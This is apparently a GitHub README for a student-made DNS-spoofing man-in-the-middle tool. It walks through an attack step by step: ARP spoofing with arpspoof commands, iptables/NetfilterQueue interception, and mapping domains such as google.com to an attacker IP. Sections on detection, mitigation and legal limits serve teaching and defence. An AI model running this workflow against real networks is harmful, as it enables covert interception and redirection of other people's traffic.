# 🌐 DNS Spoof MITM - Educational Penetration Testing Tool

<div align="center">

[![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Kali-red.svg)]()
[![License](https://img.shields.io/badge/license-Educational%20Use%20Only-green.svg)](LICENSE)
[![Scapy](https://img.shields.io/badge/powered%20by-Scapy-orange.svg)](https://scapy.net/)

**Man-in-the-Middle DNS Spoofing Tool for Penetration Testing Labs**

[Features](#-features) •
[Installation](#-installation) •
[Usage](#-usage) •
[Lab Setup](#-lab-setup) •
[Legal](#️-legal-disclaimer)

</div>

---

## ⚠️ LEGAL DISCLAIMER

> **FOR AUTHORIZED PENETRATION TESTING AND EDUCATIONAL PURPOSES ONLY**
> 
> This tool is designed for **authorized security testing** in controlled laboratory environments.
> 
> - ❌ **NEVER** use on networks without explicit written authorization
> - ❌ Unauthorized interception of network traffic is **ILLEGAL** (wiretapping laws)
> - ✅ Use only in isolated lab environments (VMs, test networks)
> - ✅ Obtain proper authorization before any penetration test
> 
> **Violating these terms may result in:**
> - Criminal prosecution (Computer Fraud and Abuse Act, etc.)
> - Civil liability
> - Academic expulsion
> - Loss of professional certifications

**FRANÇAIS:**
Cet outil est conçu **uniquement pour des tests de sécurité autorisés** en environnement de laboratoire contrôlé. L'interception non autorisée du trafic réseau est **ILLÉGALE**. Utilisez uniquement dans des environnements isolés avec autorisation explicite.

---

## 📋 Table of Contents

- [Features](#features)
- [How It Works](#how-it-works)
- [Requirements](#requirements)
- [Installation](#installation)
- [Lab Setup](#lab-setup)
- [Usage](#usage)
- [Testing](#testing)
- [Troubleshooting](#troubleshooting)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Considerations](#legal-considerations)

---

## 🎯 Features

### Core Functionality
- **DNS Response Interception**: Captures DNS traffic in FORWARD chain (MITM position)
- **Dynamic DNS Spoofing**: Redirects specified domains to attacker-controlled IP
- **Custom Mappings**: Support for JSON-based domain-to-IP mappings
- **Packet Manipulation**: Uses Scapy for precise DNS packet modification
- **Checksum Recalculation**: Automatic IP/UDP/TCP checksum correction

### Advanced Capabilities
- **Debug Mode**: Comprehensive logging of all DNS queries and modifications
- **Clean Exit**: Automatic iptables cleanup on Ctrl+C
- **Flexible Configuration**: Command-line arguments for easy customization
- **NetfilterQueue Integration**: Efficient packet interception via kernel queuing

### Safety Features
- Signal handler for graceful shutdown
- Automatic iptables rule cleanup
- Detailed logging for analysis
- JSON configuration support for complex scenarios

---

## 🔬 How It Works

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Victim    │         │   Attacker   │         │   Gateway   │
│  (Target)   │◄───ARP──┤   (MITM)     │───ARP──►│  /Router    │
└─────────────┘  Spoof  └──────────────┘  Spoof  └─────────────┘
       │                        │                         │
       │  DNS Query             │                         │
       │  www.google.com ──────►│                         │
       │                        │  Forward Query ────────►│
       │                        │                         │
       │                        │◄────── Real Response    │
       │                        │  (Real IP)              │
       │                   [INTERCEPT]                    │
       │                   [MODIFY DNS]                   │
       │                   [SPOOF IP]                     │
       │                        │                         │
       │◄─── Spoofed Response ──│                         │
       │  (Attacker IP)         │                         │
```

### Attack Steps:

1. **ARP Spoofing**: Position attacker between victim and gateway
2. **IP Forwarding**: Enable packet forwarding on attacker machine
3. **Packet Interception**: Use iptables + NetfilterQueue to capture DNS packets
4. **DNS Modification**: Replace DNS answer with spoofed IP
5. **Checksum Correction**: Recalculate checksums for valid packets
6. **Forward Modified Packet**: Send spoofed response to victim

---

## 📦 Requirements

### Operating System
- **Primary**: Kali Linux 2023.x+
- **Alternative**: Parrot OS, Ubuntu 20.04+ with security tools

### Python Version
- Python 3.8 or higher

### System Dependencies

```bash
# Required packages
libnetfilter-queue-dev
python3-netfilterqueue
iptables
```

### Python Dependencies

```bash
scapy>=2.5.0
NetfilterQueue>=1.0.0
```

### Network Requirements
- Attacker machine must be on same network segment as victim
- Ability to perform ARP spoofing (dsniff/ettercap/arpspoof)
- Root/sudo privileges on attacker machine

---

## 🔧 Installation

### Step 1: System Dependencies (Kali Linux)

```bash
# Update package lists
sudo apt update

# Install NetfilterQueue library
sudo apt install -y libnetfilter-queue-dev python3-netfilterqueue

# Install additional tools
sudo apt install -y dsniff arpspoof tcpdump wireshark
```

### Step 2: Python Dependencies

```bash
# Install via pip
pip3 install scapy NetfilterQueue

# Or create virtual environment (optional)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Step 3: Download the Script

```bash
# Clone repository
git clone https://github.com/melissachall/DNS-Spoof-MITM.git
cd DNS-Spoof-MITM

# Make script executable
chmod +x dnsspoof.py
```

### Step 4: Enable IP Forwarding

```bash
# Temporary (until reboot)
sudo sysctl -w net.ipv4.ip_forward=1

# Permanent (edit /etc/sysctl.conf)
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

---

## 🧪 Lab Setup

### Recommended Virtual Lab Configuration

```
┌────────────────────────────────────────────────────────────┐
│                    VirtualBox/VMware                       │
│                                                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │  Kali Linux  │  │   Windows    │  │   pfSense    │   │
│  │  (Attacker)  │  │   (Victim)   │  │  (Gateway)   │   │
│  │              │  │              │  │              │   │
│  │ 192.168.1.10 │  │ 192.168.1.20 │  │ 192.168.1.1  │   │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘   │
│         │                 │                 │            │
│         └─────────────────┴─────────────────┘            │
│                   Internal Network                        │
│                   (192.168.1.0/24)                       │
└────────────────────────────────────────────────────────────┘
```

### Network Configuration

**Attacker (Kali Linux):**
```bash
IP: 192.168.1.10
Gateway: 192.168.1.1
Interface: eth0
```

**Victim (Windows/Linux):**
```bash
IP: 192.168.1.20
Gateway: 192.168.1.1
DNS: 192.168.1.1 (or 8.8.8.8)
```

**Gateway (pfSense/Router):**
```bash
IP: 192.168.1.1
DNS: 8.8.8.8, 8.8.4.4
```

---

## 🚀 Usage

### Basic Usage

```bash
# Run with default settings (spoofs to 192.168.198.129)
sudo python3 dnsspoof.py
```

### Command-Line Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `--spoof IP` | Target IP for DNS redirection | `--spoof 192.168.1.10` |
| `--debug` | Enable verbose debug logging | `--debug` |
| `--json FILE` | Load domain mappings from JSON | `--json domains.json` |

### Examples

#### 1. Basic Spoof with Custom IP

```bash
sudo python3 dnsspoof.py --spoof 192.168.1.10
```

#### 2. Debug Mode (See All DNS Traffic)

```bash
sudo python3 dnsspoof.py --spoof 192.168.1.10 --debug
```

#### 3. Custom Domain Mappings from JSON

```bash
sudo python3 dnsspoof.py --json custom_domains.json --debug
```

---

## 📝 Configuration

### Default Domain Mappings (Built-in)

```python
dns_hosts = {
    b"www.google.com.": "192.168.198.129",
    b"google.com.": "192.168.198.129",
    b"facebook.com.": "192.168.198.129",
}
```

### Custom JSON Mapping

Create a file `domains.json`:

```json
{
    "www.google.com.": "192.168.1.10",
    "google.com.": "192.168.1.10",
    "www.facebook.com.": "192.168.1.10",
    "facebook.com.": "192.168.1.10",
    "www.twitter.com.": "192.168.1.10",
    "twitter.com.": "192.168.1.10",
    "www.youtube.com.": "192.168.1.10",
    "youtube.com.": "192.168.1.10"
}
```

**Note**: Domain names must end with a dot (`.`) to match DNS packet format.

---

## 🎯 Complete Attack Workflow

### Step 1: Prepare Attacker Machine

```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Verify network interface
ip addr show

# 3. Identify victim and gateway IPs
sudo netdiscover -i eth0
# or
sudo arp-scan --localnet
```

### Step 2: ARP Spoofing (Open 2 Terminals)

**Terminal 1: Spoof Victim → Gateway**
```bash
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
```

**Terminal 2: Spoof Gateway → Victim**
```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.20
```

### Step 3: Start DNS Spoof (Terminal 3)

```bash
sudo python3 dnsspoof.py --spoof 192.168.1.10 --debug
```

### Step 4: Test from Victim Machine

**Windows Victim:**
```cmd
# Clear DNS cache
ipconfig /flushdns

# Test DNS resolution
nslookup www.google.com

# Test connectivity
ping www.google.com
```

**Linux Victim:**
```bash
# Clear DNS cache
sudo systemd-resolve --flush-caches

# Test DNS resolution
dig www.google.com

# Test connectivity
ping www.google.com
```

### Step 5: Verify Attack Success

**On Attacker (check logs):**
```
2025-11-23 13:00:00 - INFO - DNS Response intercepted: b'www.google.com.'
2025-11-23 13:00:00 - INFO - Spoofing www.google.com. to 192.168.1.10
```

**On Victim (check IP):**
```
nslookup www.google.com
Server: 192.168.1.1
Address: 192.168.1.1#53

Non-authoritative answer:
Name:   www.google.com
Address: 192.168.1.10  ← SPOOFED IP!
```

### Step 6: Clean Shutdown

```bash
# Press Ctrl+C in DNS spoof terminal
# Script automatically removes iptables rules
```

---

## 🐛 Troubleshooting

### Issue 1: "Permission Denied"

```bash
Error: [Errno 13] Permission denied
```

**Solution:**
```bash
# Run with sudo
sudo python3 dnsspoof.py
```

### Issue 2: "NetfilterQueue Not Found"

```bash
ModuleNotFoundError: No module named 'netfilterqueue'
```

**Solution:**
```bash
sudo apt install libnetfilter-queue-dev python3-netfilterqueue
pip3 install NetfilterQueue
```

### Issue 3: "No Packets Intercepted"

**Check IP Forwarding:**
```bash
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

**Check ARP Spoofing:**
```bash
# On victim, check ARP table
arp -a  # Windows
arp -n  # Linux

# Gateway MAC should match attacker's MAC
```

**Check Packet Flow:**
```bash
# On attacker, capture traffic
sudo tcpdump -i eth0 port 53 -v
```

### Issue 4: "DNS Spoof Not Working"

**Verify Domain Format:**
```bash
# Enable debug mode to see exact domain names
sudo python3 dnsspoof.py --debug

# Check logs for:
# DNS Question: b'www.google.com.'
#               ^                 ^
#           Must be bytes     Must end with dot
```

**Update Mapping:**
```python
# Ensure exact match including trailing dot
dns_hosts = {
    b"www.google.com.": "192.168.1.10",  # Correct
    b"www.google.com": "192.168.1.10",   # Incorrect (no dot)
}
```

### Issue 5: "iptables Rules Not Cleaned"

```bash
# Manually remove iptables rules
sudo iptables -D FORWARD -j NFQUEUE --queue-num 0

# Verify removal
sudo iptables -L FORWARD -n -v
```

---

## 🛡️ Detection & Mitigation

### How to Detect This Attack

#### 1. ARP Spoofing Detection

```bash
# Check for duplicate MAC addresses
arp -a

# Use ARP monitoring tools
sudo arpwatch -i eth0
```

#### 2. DNS Response Anomalies

```bash
# Compare DNS responses from different sources
nslookup google.com 8.8.8.8    # Google DNS
nslookup google.com 1.1.1.1    # Cloudflare DNS
nslookup google.com             # Default DNS

# IPs should match; if different → potential spoof
```

#### 3. Network Traffic Analysis

```bash
# Monitor for suspicious ARP traffic
sudo tcpdump -i eth0 arp -v

# Look for excessive "is-at" announcements
```

### Mitigation Techniques

#### For Organizations:

1. **Static ARP Entries**
   ```bash
   # Add permanent ARP entry for gateway
   sudo arp -s 192.168.1.1 00:11:22:33:44:55
   ```

2. **802.1X Port Authentication**
   - Require authentication before network access

3. **DNSSEC Implementation**
   - Cryptographic validation of DNS responses

4. **Network Segmentation**
   - Separate critical systems from general network

5. **IDS/IPS Deployment**
   - Snort/Suricata rules for ARP spoofing detection

#### For Individuals:

1. **Use HTTPS Everywhere**
   - TLS encryption prevents content tampering

2. **VPN Usage**
   - Encrypted tunnel bypasses local MITM

3. **DNS-over-HTTPS (DoH)**
   ```bash
   # Firefox: Enable DoH in settings
   # Chrome: chrome://flags → enable-dns-over-https
   ```

4. **Verify SSL Certificates**
   - Check for certificate warnings

---

## ⚖️ Legal Considerations

### When Is This LEGAL?

✅ **Authorized Scenarios:**
- Personal lab environment (all devices owned by you)
- Academic coursework with professor approval
- Authorized penetration testing with signed contract
- Corporate security testing with management authorization
- Bug bounty programs with explicit scope

### When Is This ILLEGAL?

❌ **Prohibited Scenarios:**
- Public Wi-Fi networks (coffee shops, airports)
- Corporate networks without authorization
- ISP networks
- Educational institution networks (without IT approval)
- Any network where you don't own ALL devices

### Legal Framework

**United States:**
- **Wiretap Act (18 U.S.C. § 2511)**: Prohibits interception of electronic communications
- **Computer Fraud and Abuse Act (CFAA)**: Unauthorized access to computer systems
- Penalties: Up to 20 years imprisonment, fines up to $250,000

**European Union:**
- **GDPR Article 32**: Security of processing
- **ePrivacy Directive**: Confidentiality of communications
- Penalties: Up to €20 million or 4% of global revenue

**Canada:**
- **Criminal Code Section 184**: Interception of private communications
- Penalties: Up to 5 years imprisonment

### Best Practices for Legal Use

1. **Get Written Authorization**
   - Scope of testing
   - Authorized targets
   - Testing window
   - Reporting requirements

2. **Document Everything**
   - Testing methodology
   - Timestamps of activities
   - Findings and screenshots
   - Communication logs

3. **Use Isolated Environments**
   - Virtual labs (VirtualBox, VMware)
   - Dedicated test networks
   - No connection to production systems

4. **Follow Responsible Disclosure**
   - Report vulnerabilities to affected parties
   - Allow time for remediation
   - Don't publicly disclose until patched

---

## 🎓 Educational Objectives

This project demonstrates:

### 1. Network Protocol Analysis
- Understanding DNS protocol structure
- Packet dissection with Scapy
- TCP/IP stack manipulation

### 2. Man-in-the-Middle Techniques
- ARP spoofing fundamentals
- Traffic interception strategies
- Packet forwarding mechanics

### 3. Defensive Security
- Attack detection methods
- Mitigation strategies
- Security monitoring tools

### 4. Penetration Testing Methodology
- Reconnaissance
- Exploitation
- Post-exploitation
- Reporting

### Academic Report Structure

```markdown
1. Introduction
   - Objectives
   - Threat landscape
   - Legal/ethical statement

2. Technical Background
   - DNS protocol overview
   - ARP spoofing mechanics
   - MITM attack vectors

3. Implementation
   - Tool architecture
   - Code walkthrough
   - Libraries used (Scapy, NetfilterQueue)

4. Lab Setup
   - Network topology
   - Configuration details
   - Testing scenarios

5. Results & Analysis
   - Attack success rate
   - Detection challenges
   - Performance metrics

6. Defense Mechanisms
   - Detection methods
   - Mitigation techniques
   - Best practices

7. Conclusion
   - Lessons learned
   - Real-world implications
   - Future research

8. References
```

---

## 📚 References

### Technical Documentation
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [NetfilterQueue Documentation](https://pypi.org/project/NetfilterQueue/)
- [RFC 1035 - Domain Names](https://tools.ietf.org/html/rfc1035)

### Security Research
- MITRE ATT&CK - Adversary-in-the-Middle (T1557)
- OWASP Testing Guide - MITM Attacks
- NIST SP 800-115 - Technical Guide to Information Security Testing

### Legal Resources
- Electronic Communications Privacy Act (ECPA)
- Computer Fraud and Abuse Act (CFAA)
- GDPR - Data Protection Regulation

---

## 👨‍🎓 Author

**Melissa Hall** (@melissachall)
- Cybersecurity Student - Penetration Testing
- Educational Project - Network Security Research
- Date: November 2025

---

## 📄 License

This project is released for **educational and authorized penetration testing purposes only**.

- ✅ Study and analysis for learning
- ✅ Authorized security testing with permission
- ❌ Unauthorized network interception prohibited

**Users accept full legal responsibility for their actions.**

---

## 🙏 Acknowledgments

- Scapy development team
- NetfilterQueue contributors
- Kali Linux project
- Cybersecurity education community

---

**⚠️ FINAL WARNING ⚠️**

> This tool can cause significant harm if misused. It is designed to teach defensive security concepts by understanding offensive techniques. Always use ethically, legally, and responsibly in controlled environments only.

**Remember: "To protect a system, you must think like an attacker."**

---

**Last Updated:** 2025-11-23  
**Version:** 1.0  
**Status:** Educational Release
